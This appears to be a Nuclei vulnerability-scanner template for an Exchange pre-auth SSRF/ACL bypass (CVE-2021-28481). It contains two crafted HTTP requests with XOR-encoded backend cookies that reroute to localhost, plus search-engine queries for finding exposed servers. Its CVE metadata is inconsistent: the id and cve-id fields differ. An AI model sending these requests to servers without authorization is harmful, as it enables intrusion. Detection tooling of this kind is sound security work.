id: CVE-2021-28481

info:
  name: Microsoft Exchange - Pre-Auth SSRF / ACL Bypass (ProxyNotFound)
  author: daffainfo
  severity: critical
  description: |
    Microsoft Exchange Server contains a remote code execution caused by improper input validation in the server component, letting remote attackers execute arbitrary code, exploit requires network access to the server.
  impact: |
    Attackers can execute arbitrary code remotely, potentially leading to full system compromise or data breach
  remediation: |
    Apply the latest security patches and updates provided by Microsoft for Exchange Server
  reference:
    - https://sec.vnpt.vn/2021/04/microsoft-exchange-from-deserialization-to-post-auth-rce-cve-2021-28482
    - https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/The%20Proxy%20Era%20of%20Microsoft%20Exchange%20Server.pdf
    - https://www.youtube.com/watch?v=vn4niT9XEIM
    - https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2021-28481
    - https://nvd.nist.gov/vuln/detail/cve-2021-28481
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-28480
    cwe-id: D-CWE-noinfo
    epss-score: 0.04893
    epss-percentile: 0.89276
    cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_23:*:*:*:*:*:*,cpe:2.3:a:microsoft:exchange_server:2016:cumulative_update_19:*:*:*:*:*:*,cpe:2.3:a:microsoft:exchange_server:2016:cumulative_update_20:*:*:*:*:*:*,cpe:2.3:a:microsoft:exchange_server:2019:cumulative_update_8:*:*:*:*:*:*,cpe:2.3:a:microsoft:exchange_server:2019:cumulative_update_9:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: microsoft
    product: exchange_server
    shodan-query:
      - http.favicon.hash:1768726119
      - http.title:"outlook"
      - cpe:"cpe:2.3:a:microsoft:exchange_server"
    fofa-query:
      - title="outlook"
      - icon_hash=1768726119
    google-query: intitle:"outlook"
  tags: cve,cve2021,ssrf,rce,exchange,microsoft,vkev

variables:
  email: '{{rand_base(5)}}@{{rand_base(5)}}.com'
  servername: '{{randstr}}'
  epoch: '{{unix_time()}}'
  date: '{{date_time("%Y-%M-%DT%H:%m:%s")}}'
  fullstr: '{{concat("Server", "~", servername, "~", epoch, "~", date)}}'

flow: |
  function xorStringToHex(input) {
    let result = "";
    for (let i = 0; i < input.length; i++) {
      let xorChar = input.charCodeAt(i) ^ 0xff;
      result += xorChar.toString(16).padStart(2, "0");
    }
    return result;
  }

  let str = template.fullstr;
  let rawXor1 = xorStringToHex(str);
  set("rawXor1", rawXor1);

  let rawXor2 = xorStringToHex(str.replace(template.servername,"localhost"));
  set("rawXor2", rawXor2);
  http(1);
  http(2);

http:
  - raw:
      - |
        POST /ews/wssecurity HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BackEndCookie={{email}}={{base64(hex_decode(rawXor1))}}
        X-AnchorMailbox: {{email}}
        Content-Type: application/x-www-form-urlencoded

        {{randstr}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "len(body) == 0"
          - "status_code == 200"
        condition: and
        internal: true

  - raw:
      - |
        POST /ews/wssecurity HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BackEndCookie={{email}}={{base64(hex_decode(rawXor2))}}
        X-AnchorMailbox: {{email}}
        Content-Type: application/x-www-form-urlencoded

        {{randstr}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "contains_all(body, 'customErrors', '/EWS', 'defaultRedirect')"
          - "status_code == 500"
        condition: and
